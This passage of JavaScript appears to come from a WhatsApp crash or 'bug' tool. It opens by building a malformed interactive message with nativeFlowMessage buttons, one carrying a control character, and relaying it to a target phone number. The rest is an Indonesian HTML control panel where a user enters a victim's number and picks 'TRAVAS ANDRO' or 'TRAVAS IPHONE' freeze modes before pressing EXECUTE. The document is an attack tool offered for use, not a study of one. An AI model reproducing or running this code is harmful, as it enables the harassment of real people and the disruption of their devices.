                      format: "DEFAULT"
                    },
                    interactiveMessage: {
                      contextInfo,
                      body: {
                        text: "⏤‌C I K Y × B A C K‌  ⃟ ✧",
                      },
                      nativeFlowMessage: {
                        buttons: [
                          {
                            name : "single_select",
                            buttonParamsJson: ApiNewFC + "",
                          },
                          {
                            name : "call_permission_request",
                            buttonParamsJson: ApiNewFC + "\u0003",
                          },
                        ],
                      },
                    },
                  }
                }
              },
              remoteJid: "@s.whatsapp.net"
            }
          }
        }
      }
    }
  }, 
  {});
  
  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}
// ==================== HTML TEMPLATE ==================== //
const executionPage = (
  status = "🟥 Ready",
  detail = {},
  isForm = true,
  userInfo = {},
  message = "",
  mode = ""
) => {
  const { username, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      year: "2-digit",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
    })
    : "-";

  return `<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Vonzie Web-API Panel</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
  <style>
    *{margin:0;padding:0;box-sizing:border-box;}
    body{
      font-family:'Orbitron',sans-serif;
      background:radial-gradient(circle at center,#0a0012,#000);
      color:#f0b3ff;
      height:100vh;
      display:flex;
      justify-content:center;
      align-items:center;
      overflow:hidden;
      position:relative;
    }

    /* 🔮 Grid Background */
    body::before{
      content:"";
      position:absolute;
      inset:0;
      background-image:
        linear-gradient(0deg,rgba(204,0,255,0.1) 1px,transparent 1px),
        linear-gradient(90deg,rgba(204,0,255,0.1) 1px,transparent 1px);
      background-size:60px 60px;
      animation:gridMove 20s linear infinite;
      z-index:-2;
    }
    @keyframes gridMove{
      from{background-position:0 0,0 0;}
      to{background-position:600px 600px,600px 600px;}
    }

    /* 💫 Glow */
    body::after{
      content:"";
      position:absolute;
      width:600px;height:600px;
      border-radius:50%;
      background:radial-gradient(circle,rgba(204,0,255,0.25),transparent 70%);
      filter:blur(120px);
      animation:rotateGlow 30s linear infinite;
      z-index:-1;
    }
    @keyframes rotateGlow{
      0%{transform:rotate(0deg);}
      100%{transform:rotate(360deg);}
    }

    /* 🌐 Container */
    .container{
      background:rgba(15,0,25,0.8);
      border:1px solid rgba(255,0,255,0.3);
      box-shadow:0 0 40px rgba(204,0,255,0.6), inset 0 0 20px rgba(153,0,255,0.2);
      backdrop-filter:blur(25px);
      padding:30px;
      border-radius:25px;
      width:90%;
      max-width:430px;
      text-align:center;
      animation:fadeIn 1.5s ease forwards;
    }
    @keyframes fadeIn{from{opacity:0;transform:scale(0.9);}to{opacity:1;transform:scale(1);}}

    /* 🧿 Logo */
    .logo{
      width:90px;height:90px;
      border-radius:50%;
      border:2px solid #cc00ff;
      box-shadow:0 0 25px #cc00ff,0 0 40px #9900cc inset;
      object-fit:cover;
      margin-bottom:15px;
      animation:pulse 2s infinite alternate;
    }
    @keyframes pulse{0%{box-shadow:0 0 20px #cc00ff;}100%{box-shadow:0 0 50px #ff00ff;}}

    .username{
      font-size:1.4rem;
      color:#ffb3ff;
      text-shadow:0 0 8px #ff00ff;
      margin-bottom:6px;
      animation:glitch 2s infinite;
    }
    @keyframes glitch{
      0%,100%{text-shadow:2px 0 #f0f,-2px 0 #0ff;}
      50%{text-shadow:-2px 0 #0ff,2px 0 #f0f;}
    }

    .connected{
      display:flex;
      justify-content:center;
      align-items:center;
      font-size:0.9rem;
      color:#00ff9c;
      margin-bottom:20px;
    }
    .connected::before{
      content:"";
      width:10px;height:10px;
      border-radius:50%;
      background:#00ff9c;
      margin-right:8px;
      box-shadow:0 0 10px #00ff9c;
    }

    /* 🔢 Input */
    input[type="text"]{
      width:100%;
      padding:14px;
      border:none;
      border-radius:12px;
      background:rgba(80,0,120,0.3);
      color:#fff;
      margin-bottom:20px;
      text-align:center;
      font-size:1rem;
      outline:none;
      transition:0.3s;
    }
    input[type="text"]:focus{
      background:rgba(110,0,160,0.5);
      box-shadow:0 0 15px #cc00ff, inset 0 0 15px #ff00ff;
    }

    /* 🧨 Buttons */
    .buttons-grid{
      display:grid;
      grid-template-columns:1fr 1fr;
      gap:14px;
      margin-bottom:20px;
    }
    .mode-btn{
      background:linear-gradient(135deg,#330033,#7700aa);
      border:none;
      border-radius:12px;
      color:#fff;
      font-weight:bold;
      padding:14px;
      cursor:pointer;
      text-shadow:0 0 8px #ff00ff;
      transition:0.3s;
    }
    .mode-btn:hover{
      background:linear-gradient(135deg,#aa00ff,#ff00ff);
      transform:scale(1.05);
      box-shadow:0 0 20px #cc00ff;
    }
    .mode-btn.selected{
      background:linear-gradient(135deg,#ff00ff,#cc00ff);
      color:#000;
      box-shadow:0 0 25px #ff00ff;
    }

    /* 🚀 Execute button */
    .execute-button{
      width:100%;
      background:linear-gradient(90deg,#8000ff,#cc00ff);
      border:none;
      border-radius:12px;
      padding:14px;
      color:#fff;
      font-size:1.1rem;
      font-weight:bold;
      cursor:pointer;
      transition:0.3s;
      box-shadow:0 0 15px #9900ff;
    }
    .execute-button:disabled{
      background:#330033;
      opacity:0.5;
      cursor:not-allowed;
    }
    .execute-button:hover:not(:disabled){
      transform:translateY(-2px);
      box-shadow:0 0 25px #ff00ff;
    }

    /* 🔁 Footer */
    .footer-action-container{
      margin-top:25px;
      display:flex;
      flex-wrap:wrap;
      justify-content:center;
      gap:10px;
    }
    .footer-button{
      border:1px solid rgba(204,0,255,0.5);
      border-radius:8px;
      padding:8px 12px;
      display:flex;
      align-items:center;
      gap:6px;
      color:#ff99ff;
      background:rgba(80,0,100,0.2);
      transition:0.3s;
      font-size:14px;
    }
    .footer-button:hover{
      background:rgba(204,0,255,0.3);
      box-shadow:0 0 10px #cc00ff;
    }
    .footer-button a{
      color:inherit;
      text-decoration:none;
      display:flex;
      align-items:center;
      gap:6px;
    }

    /* 🔄 Loader overlay */
    #loader{
      position:fixed;
      inset:0;
      background:rgba(10,0,20,0.95);
      display:flex;
      flex-direction:column;
      justify-content:center;
      align-items:center;
      color:#ff00ff;
      font-size:1.3rem;
      z-index:99;
      opacity:0;
      pointer-events:none;
      transition:0.4s;
    }
    #loader.active{
      opacity:1;
      pointer-events:auto;
    }
    .loader-ring{
      border:4px solid rgba(255,0,255,0.2);
      border-top:4px solid #ff00ff;
      border-radius:50%;
      width:70px;
      height:70px;
      animation:spin 1s linear infinite;
      margin-bottom:10px;
    }
    @keyframes spin{to{transform:rotate(360deg);}}

  </style>
</head>
<body>
  <div id="loader">
    <div class="loader-ring"></div>
    <div>EXECUTING...</div>
  </div>

  <div class="container">
    <img src="https://e.top4top.io/p_3501jjn601.jpg" alt="Logo" class="logo" />
    <div class="username">Welcome, <span class="glitch">User</span></div>
    <div class="connected">CONNECTED</div>

    <input type="text" id="targetInput" placeholder="Enter target number e.g. 62xxxx">

    <div class="buttons-grid">
      <button class="mode-btn" data-mode="andros"><i class="fas fa-skull-crossbones"></i> TRAVAS ANDRO</button>
      <button class="mode-btn" data-mode="ios"><i class="fas fa-dumpster-fire"></i> TRAVAS IPHONE</button>
    </div>

    <button class="execute-button" id="executeBtn" disabled><i class="fas fa-rocket"></i> EXECUTE</button>

    <div class="footer-action-container">
      <div class="footer-button">
        <a href="https://t.me/Rbcdeep" target="_blank"><i class="fab fa-telegram"></i> Developer</a>
      </div>
      <div class="footer-button">
        <a href="/logout"><i class="fas fa-sign-out-alt"></i> Logout</a>
      </div>
      <div class="footer-button">
        <i class="fas fa-user"></i> User&nbsp;|&nbsp;<i class="fas fa-clock"></i> <span id="time"></span>
      </div>
    </div>
  </div>

  <audio id="clickSound" src="https://assets.mixkit.co/active_storage/sfx/2002/2002-preview.mp3"></audio>
  <audio id="launchSound" src="https://assets.mixkit.co/active_storage/sfx/2748/2748-preview.mp3"></audio>

  <script>
    const input=document.getElementById("targetInput");
    const modeButtons=document.querySelectorAll(".mode-btn");
    const executeBtn=document.getElementById("executeBtn");
    const loader=document.getElementById("loader");
    const timeEl=document.getElementById("time");
    const clickSound=document.getElementById("clickSound");
    const launchSound=document.getElementById("launchSound");

    function updateClock(){
      const now=new Date();
      timeEl.textContent=now.toLocaleTimeString("id-ID",{hour12:false});
    }
    setInterval(updateClock,1000);
    updateClock();

    let selectedMode=null;
    modeButtons.forEach(btn=>{
      btn.addEventListener("click",()=>{
        clickSound.currentTime=0;
        clickSound.play();
        modeButtons.forEach(b=>b.classList.remove("selected"));
        btn.classList.add("selected");
        selectedMode=btn.dataset.mode;
        executeBtn.disabled=false;
      });
    });

    function isValidNumber(num){return /^62\\d{7,13}$/.test(num);}

    executeBtn.addEventListener("click",()=>{
      const number=input.value.trim();
      if(!isValidNumber(number)){
        alert("Nomor tidak valid. Harus dimulai dengan 62 dan total 10-15 digit.");
        return;
      }
      launchSound.currentTime=0;
      launchSound.play();
      loader.classList.add("active");
      setTimeout(()=>{
        window.location.href=`/execution?mode=${selectedMode}&target=${number}`;
      },2500);
    });
  </script>
</body>
</html>
  `;
};
